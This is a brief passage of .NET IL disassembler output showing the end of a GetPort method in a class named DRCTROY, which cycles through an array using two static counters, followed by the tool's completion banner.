    IL_0016:  bge.s      IL_0020

    IL_0018:  ldloc.1
    IL_0019:  ldsfld     int32 DRCTROY::Pc
    IL_001e:  ldelem.ref
    IL_001f:  ret

    IL_0020:  ldc.i4.0
    IL_0021:  stsfld     int32 DRCTROY::Pc
    IL_0026:  ldsfld     int32 DRCTROY::Hc
    IL_002b:  ldc.i4.1
    IL_002c:  add.ovf
    IL_002d:  stsfld     int32 DRCTROY::Hc
    IL_0032:  ldloc.1
    IL_0033:  ldsfld     int32 DRCTROY::Pc
    IL_0038:  ldelem.ref
    IL_0039:  ret
  } // end of method DRCTROY::GetPort

} // end of class DRCTROY


// =============================================================

// *********** DISASSEMBLY COMPLETE ***********************
// WARNING: Created Win32 resource file DRCTROY.res
